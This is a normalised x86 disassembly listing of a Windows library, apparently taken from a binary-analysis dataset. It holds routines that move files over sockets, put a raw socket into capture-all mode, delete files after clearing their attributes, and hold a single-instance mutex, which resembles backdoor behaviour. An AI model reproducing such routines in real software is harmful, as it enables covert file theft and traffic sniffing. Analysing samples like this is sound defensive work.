push 0x7fe
mov [ ebp - 0x908 ] ax
xor ebx ebx
lea eax [ ebp - 0x906 ]
push ebx
push eax
mov esi ecx
call sub_1000b660
push 0x103
lea eax [ ebp - 0x107 ]
push ebx
push eax
mov [ ebp - 0x108 ] bl
call sub_1000b660
add esp 0x18
push ebx
push 0x80
push 0x3
push ebx
push 0x1
push 0x80000000
push edi
mov [ ebp - 0x29a4 ] r--data
call [ CreateFileW@IAT ]
mov [ ebp - 0x29a0 ] eax
cmp eax 0xffffffff
je r-xdata
push 0x2
push esi
call sub_1000536c
lea eax [ ebp - 0x960 ]
call sub_100049d2
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_1000ac69
leave
retn
push ebx
push esi
call sub_1000536c
lea eax [ ebp - 0x108 ]
push eax
lea eax [ ebp - 0x29a4 ]
call sub_100051de
push ebx
lea eax [ ebp - 0x108 ]
push eax
push 0x400
lea ebx [ ebp - 0x908 ]
call sub_10008171
mov eax ebx
push eax
push [ esi ]
mov eax 0x800
call sub_10006dde
add esp 0x14
push [ ebp - 0x29a0 ]
call [ CloseHandle@IAT ]
xor eax eax
inc eax
mov eax [ ebp - 0x299c ]
cmp eax ebx
je r-xdata
lea ecx [ ebp - 0x2998 ]
push ecx
lea ecx [ ebp - 0x960 ]
call sub_100049f6
call sub_100062d1
test eax eax
je r-xdata
push ebx
lea eax [ ebp - 0x299c ]
push eax
push 0x2000
lea eax [ ebp - 0x2998 ]
push eax
push [ ebp - 0x29a0 ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
push 0x4c7
push esi
call sub_1000536c
push [ ebp - 0x29a0 ]
call [ CloseHandle@IAT ]
jmp r-xdata
xor eax eax
jmp r-xdata
sub_100064f5
mov eax [ esp + 0x10 ]
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
push 0x2f
pop ecx
push eax
lea eax [ esi + 0x2a ]
push eax
mov [ esi + 0x28 ] cx
call [ PathMatchSpecW@IAT ]
test eax eax
je r-xdata
xor eax eax
inc eax
mov eax [ esp + 0x14 ]
push esi
push edi
call sub_10006dde
pop ecx
pop ecx
cmp eax [ esp + 0x14 ]
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
retn 0x10
sub_1000653a
push ebp
lea ebp [ esp - 0x198 ]
sub esp 0x218
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x194 ] eax
mov eax [ ebp + 0x1a0 ]
mov ecx [ esi ]
push edi
push 0x1
mov [ ebp - 0x78 ] eax
lea eax [ ebp - 0x80 ]
push eax
push sub_100064f5
push 0x1
mov [ ebp - 0x7c ] ecx
push r--data
mov ecx esi
mov [ ebp - 0x80 ] esi
call sub_10005b9c
push 0x208
mov edi eax
lea eax [ ebp - 0x74 ]
push 0x0
push eax
call sub_1000b660
lea eax [ ebp - 0x74 ]
push eax
push [ esi ]
mov eax 0x12c
call sub_10006dde
mov ecx [ ebp + 0x194 ]
add esp 0x14
mov eax edi
xor ecx ebp
pop edi
call sub_1000ac69
add ebp 0x198
leave
retn 0x4
sub_100065bf
push ebp
mov ebp esp
sub esp 0x24c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
call sub_1001265d
mov esi 0x420
push esi
call sub_1000b786
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
xor ebx ebx
push esi
push 0x0
push ebx
call sub_1000b660
add esp 0xc
jmp r-xdata
push edi
push [ ebp + 0x8 ]
lea esi [ ebp - 0x24c ]
call sub_10003ee4
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ ebx ] edi
mov edi 0x248
jmp r-xdata
lea eax [ ebp - 0x24c ]
push eax
mov ecx ebx
call sub_1000539b
test eax eax
je r-xdata
push [ ebx ]
call [ closesocket@IAT ]
push ebx
call sub_1000b6da
pop ecx
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000ac69
leave
retn
sub_1000664f
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
xor ebx ebx
push ebx
push 0x80
push 0x3
push ebx
push 0x1
push 0x80000000
push [ ebp + 0xc ]
or esi 0xffffffff
mov [ ebp - 0xc ] esi
call [ CreateFileW@IAT ]
mov edi eax
or eax esi
cmp edi eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x8 ]
push eax
push edi
call [ GetFileSizeEx@IAT ]
test eax eax
je r-xdata
push edi
call [ CloseHandle@IAT ]
mov eax esi
push ebx
push ebx
push [ ebp + 0x14 ]
mov ebx [ ebp + 0x10 ]
push ebx
push edi
call [ SetFilePointerEx@IAT ]
test eax eax
je r-xdata
sub [ ebp - 0x8 ] ebx
mov eax [ ebp + 0x14 ]
sbb [ ebp - 0x4 ] eax
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x8 ]
call sub_100066df
mov esi eax
add esp 0x10
cmp esi [ ebp - 0x8 ]
jne r-xdata
or esi 0xffffffff
mov [ ebp - 0xc ] esi
cmp edx [ ebp - 0x4 ]
je r-xdata
sub_100066df
push ebp
mov ebp esp
mov eax 0x201c
call sub_1001ac50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov [ ebp - 0x2010 ] eax
mov eax [ ebp + 0x14 ]
push edi
xor edi edi
xor esi esi
mov [ ebp - 0x2014 ] eax
test eax eax
jl r-xdata
mov edx esi
mov eax edi
jg r-xdata
cmp [ ebp - 0x2014 ] 0x0
jg r-xdata
test ebx ebx
jbe r-xdata
mov eax 0x2000
jl r-xdata
mov eax [ ebp - 0x200c ]
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
cmp ebx 0x2000
jae r-xdata
lea ecx [ ebp - 0x2008 ]
push ecx
push [ ebp + 0x8 ]
call sub_10006dde
pop ecx
pop ecx
cmp eax [ ebp - 0x200c ]
jne r-xdata
push 0x0
lea ecx [ ebp - 0x200c ]
push ecx
push eax
lea eax [ ebp - 0x2008 ]
push eax
push [ ebp - 0x2010 ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
xor eax eax
xor edx edx
jmp r-xdata
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000ac69
leave
retn
xor eax eax
add edi [ ebp - 0x200c ]
adc esi eax
sub ebx [ ebp - 0x200c ]
sbb [ ebp - 0x2014 ] eax
cmp esi [ ebp + 0x14 ]
jl r-xdata
jg r-xdata
cmp edi [ ebp + 0x10 ]
jb r-xdata
sub_100067c7
push ebp
mov ebp esp
mov eax 0x2030
call sub_1001ac50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
push ebx
push esi
push edi
mov esi 0x80
mov edi ecx
push esi
xor ebx ebx
push edi
mov [ ebp - 0x2018 ] 0x1
mov [ ebp - 0x2014 ] ebx
mov [ ebp - 0x2010 ] ebx
call [ SetFileAttributesW@IAT ]
push ebx
push esi
push 0x4
push ebx
push 0x3
push 0xc0000000
push edi
call [ CreateFileW@IAT ]
mov esi eax
mov [ ebp - 0x201c ] esi
cmp esi 0xffffffff
jne r-xdata
lea eax [ ebp - 0x202c ]
push eax
push esi
call [ GetFileSizeEx@IAT ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push ebx
push ebx
push [ ebp - 0x2028 ]
push [ ebp - 0x202c ]
push esi
call [ SetFilePointerEx@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000ac69
leave
retn
cmp [ ebp + 0x10 ] ebx
jl r-xdata
push [ ebp - 0x201c ]
call [ SetEndOfFile@IAT ]
push [ ebp - 0x201c ]
call [ CloseHandle@IAT ]
mov eax [ ebp - 0x2018 ]
jg r-xdata
mov esi [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
mov ecx esi
sub ecx [ ebp - 0x2014 ]
sbb eax [ ebp - 0x2010 ]
cmp eax ebx
jg r-xdata
cmp [ ebp + 0xc ] ebx
jbe r-xdata
mov esi 0x2000
jl r-xdata
mov [ ebp - 0x2018 ] ebx
push ebx
push esi
lea eax [ ebp - 0x200c ]
push eax
push [ ebp + 0x8 ]
call [ recv@IAT ]
mov edi eax
cmp edi ebx
jle r-xdata
sub esi [ ebp - 0x2014 ]
jmp r-xdata
cmp ecx 0x2000
jae r-xdata
mov [ ebp - 0x2020 ] edi
mov [ ebp - 0x2024 ] ebx
lea esi [ ebp - 0x200c ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
push 0x14
pop eax
call sub_10006d56
test eax eax
jle r-xdata
mov eax edi
cdq
add [ ebp - 0x2014 ] eax
adc [ ebp - 0x2010 ] edx
mov eax [ ebp - 0x2010 ]
cmp eax [ ebp + 0x10 ]
jg r-xdata
push ebx
lea eax [ ebp - 0x2024 ]
push eax
push [ ebp - 0x2020 ]
push esi
push [ ebp - 0x201c ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
jl r-xdata
mov eax [ ebp - 0x2024 ]
add esi eax
sub [ ebp - 0x2020 ] eax
jne r-xdata
mov eax [ ebp - 0x2014 ]
cmp eax [ ebp + 0xc ]
jae r-xdata
jmp r-xdata
sub_1000696e
push esi
push edi
mov esi rw-data
push esi
xor edi edi
call [ EnterCriticalSection@IAT ]
mov ecx [ rw-data ]
mov eax [ rw-data ]
xor edx edx
test ecx ecx
jle r-xdata
push esi
call [ LeaveCriticalSection@IAT ]
mov eax edi
pop edi
pop esi
retn 0x4
push ebx
test ecx ecx
je r-xdata
mov eax [ eax + 0x4 ]
inc edx
cmp edx ecx
jl r-xdata
xor edi edi
inc edi
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov [ ecx + 0x4 ] edx
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
mov [ ecx ] edx
mov ecx [ rw-data ]
cmp eax ecx
jne r-xdata
mov ebx [ eax + 0x8 ]
cmp ebx [ esp + 0x10 ]
je r-xdata
jmp r-xdata
mov ecx [ rw-data ]
cmp eax ecx
jne r-xdata
mov ecx [ ecx + 0x4 ]
mov [ rw-data ] ecx
jmp r-xdata
pop ebx
push eax
call sub_1000b6da
dec [ rw-data ]
pop ecx
mov ecx [ ecx ]
mov [ rw-data ] ecx
sub_100069fc
push esi
push edi
mov esi rw-data
push esi
xor edi edi
call [ EnterCriticalSection@IAT ]
mov ecx [ rw-data ]
mov eax [ rw-data ]
xor edx edx
test ecx ecx
jle r-xdata
push esi
call [ LeaveCriticalSection@IAT ]
mov eax edi
pop edi
pop esi
retn 0x4
push ebx
lea edi [ eax + 0x8 ]
mov eax [ eax + 0x4 ]
inc edx
cmp edx ecx
jl r-xdata
mov ebx [ eax + 0x8 ]
cmp ebx [ esp + 0x10 ]
je r-xdata
jmp r-xdata
pop ebx
sub_10006a43
push esi
push edi
mov esi rw-data
push esi
xor edi edi
call [ EnterCriticalSection@IAT ]
mov ecx [ rw-data ]
mov eax [ rw-data ]
xor edx edx
test ecx ecx
jle r-xdata
push esi
call [ LeaveCriticalSection@IAT ]
mov eax edi
pop edi
pop esi
retn 0x4
push ebx
mov edi [ eax + 0xc ]
mov eax [ eax + 0x4 ]
inc edx
cmp edx ecx
jl r-xdata
mov ebx [ eax + 0x8 ]
cmp ebx [ esp + 0x10 ]
je r-xdata
jmp r-xdata
pop ebx
sub_10006a8a
push ebx
push esi
push 0x18
call sub_1000b786
mov ebx eax
xor esi esi
pop ecx
cmp ebx esi
je r-xdata
xor ebx ebx
push 0x10
lea eax [ ebx + 0x8 ]
push esi
push eax
call sub_1000b660
add esp 0xc
jmp r-xdata
push 0x18
push esi
push ebx
call sub_1000b660
add esp 0xc
cmp [ rw-data ] esi
jne r-xdata
xor eax eax
jmp r-xdata
cmp ebx esi
jne r-xdata
push edi
lea edi [ ebx + 0x8 ]
lea esi [ esp + 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov eax [ rw-data ]
mov [ ebx ] eax
mov eax [ rw-data ]
mov [ ebx + 0x4 ] eax
mov eax [ rw-data ]
mov [ eax ] ebx
inc [ rw-data ]
mov eax [ rw-data ]
mov [ rw-data ] ebx
pop edi
mov [ rw-data ] ebx
mov [ rw-data ] ebx
pop esi
pop ebx
retn 0x10
sub_10006b18
push ebp
mov ebp esp
push ecx
xor eax eax
inc eax
mov [ ebp - 0x4 ] ax
xor eax eax
push 0x4
mov [ ebp - 0x2 ] ax
lea eax [ ebp - 0x4 ]
push eax
push 0x80
push 0xffff
push [ ebp + 0x8 ]
call [ setsockopt@IAT ]
push [ ebp + 0x8 ]
call [ closesocket@IAT ]
leave
retn
sub_10006b4d
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push 0x6
push 0x1
push 0x2
call [ socket@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push edi
push 0x2
pop eax
push [ ebp + 0xc ]
mov [ ebp - 0x28 ] ax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x24 ] eax
call [ htons@IAT ]
mov [ ebp - 0x26 ] ax
push 0x10
lea eax [ ebp - 0x28 ]
push eax
push esi
call [ connect@IAT ]
cmp eax 0xffffffff
jne r-xdata
xor eax eax
jmp r-xdata
movzx edi [ ebp + 0xc ]
push edi
lea eax [ ebp - 0x18 ]
push r--data
push eax
call [ wsprintfW@IAT ]
lea eax [ ebp - 0x18 ]
push eax
call sub_1000a57e
push edi
call sub_1001265d
add esp 0x14
mov eax esi
call [ GetLastError@IAT ]
push esi
mov edi eax
call sub_10006b18
pop ecx
push edi
call [ SetLastError@IAT ]
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_1000ac69
leave
retn
pop edi
sub_10006bf2
push ebp
mov ebp esp
sub esp 0x108
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push edi
push 0x0
push eax
lea eax [ ebp - 0x108 ]
push 0x104
push eax
call sub_10008113
mov edi [ inet_addr@IAT ]
add esp 0x10
lea eax [ ebp - 0x108 ]
push eax
call edi
cmp eax 0xffffffff
lea eax [ ebp - 0x108 ]
je r-xdata
push ebx
mov ebx [ gethostbyname@IAT ]
push esi
push eax
call ebx
test eax eax
je r-xdata
push [ ebp + 0xc ]
push eax
call edi
push eax
call sub_10006b4d
pop ecx
pop ecx
jmp r-xdata
xor eax eax
mov eax [ eax + 0xc ]
mov eax [ eax ]
push [ eax ]
mov esi [ inet_ntoa@IAT ]
call esi
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_1000ac69
leave
retn
lea eax [ ebp - 0x108 ]
push eax
call ebx
test eax eax
je r-xdata
push [ ebp + 0xc ]
push eax
call edi
push eax
call sub_10006b4d
pop ecx
pop ecx
jmp r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
push [ eax ]
call esi
pop esi
pop ebx
sub_10006ca3
push ebp
mov ebp [ inet_addr@IAT ]
push ebx
call ebp
cmp eax 0xffffffff
je r-xdata
push esi
push edi
mov edi [ gethostbyname@IAT ]
push ebx
call edi
test eax eax
je r-xdata
push [ esp + 0x8 ]
push ebx
call ebp
push eax
call sub_10006b4d
pop ecx
pop ecx
pop ebp
retn
xor eax eax
mov eax [ eax + 0xc ]
mov eax [ eax ]
push [ eax ]
mov esi [ inet_ntoa@IAT ]
call esi
test eax eax
je r-xdata
push ebx
call edi
test eax eax
je r-xdata
push [ esp + 0x10 ]
push eax
call ebp
push eax
call sub_10006b4d
pop ecx
pop ecx
jmp r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
push [ eax ]
call esi
pop edi
pop esi
pop ebp
retn
sub_10006d0c
push esi
push 0x0
push [ esp + 0xc ]
mov esi 0x400
push esi
push rw-data
call sub_10008113
add esp 0x10
push eax
call [ gethostbyname@IAT ]
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
push ebx
push 0x0
push eax
call [ inet_ntoa@IAT ]
push eax
push esi
mov ebx rw-data
call sub_10008171
add esp 0xc
pop ebx
pop esi
retn
pop esi
retn
sub_10006d56
push ebp
mov ebp esp
sub esp 0x10c
xor edx edx
mov [ ebp - 0x8 ] eax
inc eax
push esi
neg eax
sbb eax eax
lea esi [ ebp - 0x8 ]
and eax esi
push eax
push edx
push edx
lea eax [ ebp - 0x10c ]
mov [ ebp - 0x108 ] ecx
push eax
inc ecx
push ecx
mov [ ebp - 0x10c ] 0x1
mov [ ebp - 0x4 ] edx
call [ select@IAT ]
pop esi
leave
retn
sub_10006d97
push esi
xor esi esi
test edi edi
jle r-xdata
xor eax eax
cmp edi esi
sete al
pop esi
retn
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x8 ]
call sub_10006d56
test eax eax
jle r-xdata
xor eax eax
pop esi
retn
push 0x0
mov eax edi
sub eax esi
push eax
mov eax [ esp + 0x14 ]
add eax esi
push eax
push [ esp + 0x14 ]
call [ recv@IAT ]
test eax eax
jle r-xdata
add esi eax
cmp esi edi
jl r-xdata
sub_10006dde
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi eax
lea eax [ ebp - 0x4 ]
push eax
push 0x8004667e
push [ ebp + 0x8 ]
xor esi esi
mov [ ebp - 0x4 ] esi
call [ ioctlsocket@IAT ]
test edi edi
jle r-xdata
call [ GetLastError@IAT ]
push eax
call sub_1001265d
add esp 0x4
mov eax [ ebp + 0xc ]
push 0x0
push edi
add eax esi
push eax
push [ ebp + 0x8 ]
call [ send@IAT ]
test eax eax
jle r-xdata
test esi esi
jg r-xdata
sub edi eax
add esi eax
test edi edi
jg r-xdata
pop edi
mov eax esi
pop esi
leave
retn
sub_10006e38
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x8004667e
push [ ebp + 0x8 ]
call [ ioctlsocket@IAT ]
neg eax
sbb eax eax
inc eax
leave
retn
sub_10006e59
push ebp
mov ebp esp
push ecx
push esi
mov esi [ rw-data ]
push esi
call sub_10006e38
pop ecx
push 0x0
push 0x1
lea eax [ ebp - 0x1 ]
push eax
push esi
call [ recv@IAT ]
pop esi
cmp eax 0x1
jne r-xdata
xor al al
leave
retn
cmp [ ebp - 0x1 ] 0xf4
jne r-xdata
mov al al
leave
retn
sub_10006e8e
push ebp
mov ebp esp
mov eax 0x4004
call sub_1001ac50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0x4004 ]
push eax
call sub_1000b4a0
add esp 0xc
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x4004 ]
push ecx
push [ ebp + 0x8 ]
add eax eax
call sub_10006dde
pop ecx
pop ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1000ac69
leave
retn
sub_10006eea
push ebp
mov ebp esp
sub esp 0x20
and [ ebp - 0x20 ] 0x0
push edi
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
xor eax eax
and [ ebp - 0x8 ] 0x0
lea edi [ ebp - 0x1c ]
stosd [ edi ]
stosd [ edi ]
xor eax eax
inc eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0xc ]
push 0x4
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x8
push 0xffff
push [ ebp + 0x8 ]
call [ setsockopt@IAT ]
pop edi
cmp eax 0xffffffff
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xc
lea eax [ ebp - 0x20 ]
push eax
push 0xc
lea eax [ ebp - 0x14 ]
push eax
push 0x98000004
push [ ebp + 0x8 ]
call [ WSAIoctl@IAT ]
xor ecx ecx
cmp eax 0xffffffff
setne cl
mov eax ecx
leave
retn
xor eax eax
leave
retn
sub_10006f6a
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x1c ]
push eax
push 0x8004667e
push [ ebp + 0x8 ]
xor ebx ebx
xor esi esi
mov [ ebp - 0x1c ] ebx
call [ ioctlsocket@IAT ]
push 0x10
lea eax [ ebp - 0x14 ]
push ebx
push eax
call sub_1000b660
add esp 0xc
push 0x2
pop eax
push [ ebp + 0x14 ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x10 ] eax
call [ htons@IAT ]
cmp [ ebp + 0xc ] ebx
mov [ ebp - 0x12 ] ax
jle r-xdata
mov eax esi
push 0x10
lea eax [ ebp - 0x14 ]
push eax
push ebx
push [ ebp - 0x18 ]
lea eax [ edi + esi ]
push eax
push [ ebp + 0x8 ]
call [ sendto@IAT ]
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
sub [ ebp - 0x18 ] eax
add esi eax
cmp [ ebp - 0x18 ] ebx
jg r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_1000ac69
leave
retn
sub_10007004
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi ecx
push r--data
mov [ ebp - 0x18 ] edi
call [ gethostbyname@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax edi
pop edi
xor ecx ebp
pop esi
call sub_1000ac69
leave
retn
push ebx
xor ebx ebx
pop ebx
mov [ edi ] 0x0
xor eax eax
xor edi edi
cmp ax [ esi + 0xa ]
jge r-xdata
mov edi [ ebp - 0x18 ]
add ebx 0x4
jmp r-xdata
test edi edi
jle r-xdata
mov eax [ esi + 0xc ]
cmp [ ebx + eax ] 0x0
je r-xdata
mov eax [ esi + 0xc ]
mov eax [ eax + ebx ]
movzx eax [ eax + edi ]
push eax
lea eax [ ebp - 0x14 ]
push r--data
push eax
call sub_1000b210
lea eax [ ebp - 0x14 ]
push eax
push [ ebp - 0x18 ]
call sub_1000bcc0
movsx eax [ esi + 0xa ]
add esp 0x14
inc edi
cmp edi eax
jl r-xdata
push r--data
push [ ebp - 0x18 ]
call sub_1000bcc0
pop ecx
pop ecx
sub_100070a2
push ebp
mov ebp esp
sub esp 0x50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push edi
push 0x10
mov [ ebp - 0x50 ] eax
lea eax [ ebp - 0x48 ]
push 0x0
push eax
call sub_1000b660
add esp 0xc
push 0x2
pop eax
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4c ] 0x10
mov [ ebp - 0x38 ] ax
call sub_10007004
push eax
call [ inet_addr@IAT ]
push 0x11
mov [ ebp - 0x34 ] eax
push 0x2
xor eax eax
push 0x2
mov [ ebp - 0x36 ] ax
call [ socket@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
push 0x10
lea eax [ ebp - 0x38 ]
push eax
push edi
call [ bind@IAT ]
cmp eax 0xffffffff
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x48 ]
push eax
push edi
call [ getsockname@IAT ]
test ebx ebx
je r-xdata
mov ecx [ ebp - 0x8 ]
xor ecx ebp
pop edi
call sub_1000ac69
leave
retn
mov eax [ ebp - 0x50 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x44 ]
mov [ ebx ] eax
mov eax edi
mov cx [ ebp - 0x46 ]
mov [ eax ] cx
sub_1000714d
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push 0x0
push 0x0
call sub_1000bea9
add esp 0x18
test eax eax
je r-xdata
leave
retn
push eax
call [ CloseHandle@IAT ]
sub_10007176
push ebp
mov ebp esp
push ecx
push esi
mov esi [ WSAGetLastError@IAT ]
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x400
call esi
push eax
push 0x0
push 0x1100
call [ FormatMessageW@IAT ]
push [ ebp - 0x4 ]
call esi
push eax
call sub_1001265d
add esp 0x8
push [ ebp - 0x4 ]
call [ LocalFree@IAT ]
pop esi
leave
retn
sub_100071b8
push ebp
mov ebp esp
sub esp 0x108
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x103
lea eax [ ebp - 0x107 ]
push 0x0
push eax
mov [ ebp - 0x108 ] 0x0
call sub_1000b660
push 0x0
push esi
lea eax [ ebp - 0x108 ]
push 0x104
push eax
call sub_10008113
add esp 0x1c
push eax
call [ inet_addr@IAT ]
mov ecx [ ebp - 0x4 ]
cmp eax 0xffffffff
setne al
xor ecx ebp
call sub_1000ac69
leave
retn
sub_10007215
push ebx
push esi
push edi
call [ GetFileAttributesW@IAT ]
mov esi [ SetFileAttributesW@IAT ]
mov ebx eax
test bl 0x2
je r-xdata
test bl 0x4
je r-xdata
and eax 0xfffffffd
push eax
push edi
call esi
test bl 0x1
je r-xdata
mov eax ebx
and eax 0xfffffffb
push eax
push edi
call esi
push edi
call [ DeleteFileW@IAT ]
test eax eax
pop esi
setne al
pop ebx
retn
and ebx 0xfffffffe
push ebx
push edi
call esi
sub_1000725b
push ebp
lea ebp [ esp - 0x198 ]
sub esp 0x218
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x194 ] eax
and [ ebp - 0x7c ] 0x0
push esi
push edi
push 0x6
pop ecx
mov esi r--data
lea edi [ ebp - 0x74 ]
[ edi ] [ esi ]
push 0x1ee
lea eax [ ebp - 0x5a ]
push 0x0
push eax
mov [ ebp - 0x78 ] 0x1
mov [ ebp - 0x80 ] 0xc
movsw [ edi ] [ esi ]
call sub_1000b660
push r--data
mov esi rw-data
push esi
call sub_1000b6e5
add esp 0x14
test eax eax
lea eax [ ebp - 0x74 ]
je r-xdata
push rw-data
push esi
jmp r-xdata
push eax
call sub_1000b31f
pop ecx
pop ecx
lea eax [ ebp - 0x74 ]
push eax
push 0x0
lea eax [ ebp - 0x80 ]
push eax
call [ CreateMutexW@IAT ]
mov [ rw-data ] eax
call [ GetLastError@IAT ]
xor ecx ecx
cmp eax 0xb7
setne cl
pop edi
pop esi
mov eax ecx
mov ecx [ ebp + 0x194 ]
xor ecx ebp
call sub_1000ac69
add ebp 0x198
leave
retn
sub_10007311
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push 0x0
push 0x0
push [ ebp + 0x8 ]
push [ esi ]
call [ RegQueryValueExW@IAT ]
test eax eax
je r-xdata
push [ esi ]
call [ RegCloseKey@IAT ]
mov eax [ ebp + 0x10 ]
pop ebp
retn
and [ ebp + 0x10 ] 0x0
sub_1000733f
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0x8 ]
push esi
mov esi eax
push esi
lea eax [ ebp - 0x4 ]
call sub_10007427
test eax eax
jl r-xdata
pop esi
leave
retn 0x8
mov edx [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub ecx edx
push ebx
push 0x0
lea eax [ esi + edx * 2 ]
pop ebx
je r-xdata
dec eax
dec eax
mov ebx 0x8007007a
mov esi ecx
sub esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
lea esi [ esi + edx + 0x7fffffff ]
sub edi eax
pop edi
test ecx ecx
jne r-xdata
movzx edx [ edi + eax ]
test dx dx
je r-xdata
xor ecx ecx
mov [ eax ] cx
mov eax ebx
pop ebx
mov [ eax ] dx
inc eax
inc eax
dec ecx
dec esi
test ecx ecx
jne r-xdata
test esi esi
je r-xdata
sub_100073aa
xor eax eax
test ecx ecx
je r-xdata
mov eax 0x80070057
cmp ecx 0x7fffffff
jbe r-xdata
retn
push ebx
push esi
lea eax [ esp + 0x10 ]
push eax
push [ esp + 0x10 ]
lea esi [ ecx - 0x1 ]
push esi
push edi
xor ebx ebx
call sub_1000c1d4
add esp 0x10
test eax eax
jl r-xdata
test eax eax
jl r-xdata
mov ebx 0x8007007a
cmp eax esi
ja r-xdata
jne r-xdata
pop esi
mov eax ebx
pop ebx
jmp r-xdata
xor eax eax
mov [ edi + esi * 2 ] ax
sub_100073f7
push esi
mov esi eax
xor eax eax
mov ecx edx
test edx edx
je r-xdata
mov eax 0x80070057
cmp [ esi ] ax
je r-xdata
retn
test eax eax
jl r-xdata
test edx edx
jne r-xdata
inc esi
inc esi
dec edx
jne r-xdata
and [ edi ] 0x0
sub ecx edx
mov [ edi ] ecx
retn
pop esi
test edi edi
je r-xdata
sub_10007427
push edi
mov edi eax
xor eax eax
test edx edx
je r-xdata
mov eax 0x80070057
cmp edx 0x7fffffff
jbe r-xdata
pop edi
retn 0x4
test eax eax
jl r-xdata
test edi edi
je r-xdata
and [ edi ] 0x0
mov eax [ esp + 0x8 ]
call sub_100073f7
jmp r-xdata
sub_10007457
push ebp
mov ebp esp
